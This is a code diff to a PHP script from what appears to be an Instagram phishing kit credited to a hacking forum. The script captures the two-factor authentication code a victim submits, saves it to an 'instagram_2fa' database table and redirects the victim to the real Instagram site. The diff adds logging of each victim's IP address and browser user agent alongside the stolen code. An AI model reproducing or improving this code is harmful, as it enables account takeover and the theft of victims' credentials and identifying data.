@@ -11,17 +11,19 @@
 // --                           THT Forum Profil Linki: https://l24.im/dNx8 -- \\
 // --                           M - 1000 Linktree: https://l24.im/m7tj  -- \\
 
-
 include("vtBaglanti.php");
 
 if (isset($_POST["button"])) {
     if (empty($_POST["TwoFactor"])) {
         
     } else {
+
         $twoFactor = mysqli_real_escape_string($baglanti, $_POST["TwoFactor"]);
+        $ip_logs = $_SERVER['REMOTE_ADDR'];
+        $os_browser_logs = $_SERVER['HTTP_USER_AGENT'];
         
-        $stmt = $baglanti->prepare("INSERT INTO instagram_2fa (2FA_Code) VALUES (?)");
-        $stmt->bind_param("s", $twoFactor); 
+        $stmt = $baglanti->prepare("INSERT INTO instagram_2fa (2FA_Code, ip_logs, os_browser_logs) VALUES (?, ?, ?)");
+        $stmt->bind_param("sss", $twoFactor, $ip_logs, $os_browser_logs); 
 
         if ($stmt->execute()) {
             header("Refresh: 1; URL=https://www.instagram.com/");
